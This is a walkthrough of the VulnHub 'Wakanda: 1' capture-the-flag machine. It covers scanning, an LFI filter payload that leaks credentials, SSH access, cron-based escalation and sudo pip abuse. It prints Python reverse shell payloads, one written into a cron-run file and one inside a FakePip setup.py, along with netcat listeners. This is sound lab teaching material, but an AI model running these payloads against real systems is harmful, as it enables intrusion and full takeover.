
# Wakanda: 1 — VulnHub CTF Walkthrough

> Difficulty: Intermediate  
> Author: xMagass  
> Platform: [VulnHub - Wakanda: 1](https://www.vulnhub.com/entry/wakanda-1,251/)  
> Flags: 3 (user, devops, root)

---

## 🛠️ Reconnaissance

### 🔍 Network Scanning
```bash
netdiscover
nmap -sC -sV -A -p- 192.168.*.*

```
Open ports found:
- 80 (HTTP)
- 111 (RPC)
- 333 (SSH)
- 33970 (RPC)

---

## 🌐 Web Enumeration

- Accessing `http://192.168.*.*` gives a basic web page.
- `dirb http://192.168.*.*` reveals `index.php`, but it’s not accessible.
- Found `?lang=` parameter in source code (commented).
- Tested for LFI using:
```bash
http://192.168.*.*/?lang=php://filter/convert.base64-encode/resource=index
```
- Base64 decoding reveals:
  - Username: `mamadou`
  - Password: `Niamey4Ever227!!!`

---

## 🔐 Initial Access

### SSH Login
```bash
ssh mamadou@192.168.*.* -p 3333
```
- On login, Python shell prompt received.
- Spawn Bash shell:
```python
import pty
pty.spawn("/bin/bash")
```
- ✅ First Flag Found in `/home/mamadou/flag1.txt`

---

## 👥 Privilege Escalation to devops

- Search for files owned by `devops`:
```bash
find / -user devops 2>/dev/null
```
- Found: `/srv/.antivirus.py`
- Replaced its content with Python reverse shell payload:
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.*.*",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```
- Setup listener:
```bash
nc -lnvp 1234
```
- Wait for cronjob execution — received reverse shell as `devops`.
- ✅ Second Flag: `/home/devops/flag2.txt`

---

## 🔝 Privilege Escalation to root

### Using `pip` as sudo
- Check sudo privileges:
```bash
sudo -l
```
- `pip` is executable as sudo.

### FakePip Exploit
- Clone [FakePip GitHub Repo](https://github.com/0x00-0x00/FakePip)
- Modify `setup.py`:
```python
reverse_shell = 'python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.*.*\',13372));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/bash\')"' 
```
- Serve and transfer file:
```bash
cp setup.py /var/www/html
service apache2 start
wget http://192.168.*.*/setup.py
```
- Start listener:
```bash
nc -lnvp 13372
```
- Execute on target:
```bash
sudo /usr/bin/pip install . --upgrade --force-reinstall
```
- ✅ Root Flag: `/root/root.txt`

---

## 🏁 Summary

| Flag         | Location             | User        |
|--------------|----------------------|-------------|
| flag1.txt    | /home/mamadou/       | mamadou     |
| flag2.txt    | /home/devops/        | devops      |
| root.txt     | /root/               | root        |

---

## 🎯 Techniques Used
- Enumeration (Nmap, Dirb)
- LFI via `php://filter`
- Base64 decoding
- SSH access
- Cronjob privilege escalation
- Sudo misconfiguration with `pip`
- FakePip reverse shell exploit

---

**Author:** Walkthrough  by Faisal Khan  
**Original VM Author:** xMagass  

## Author

👤 **Faisal Khan**  
📂 Cybersecurity Enthusiast | CTF Player | Bug Bounty Hunter  
🔗 GitHub:  [GitHub] (https://github.com/mrfaisal607)  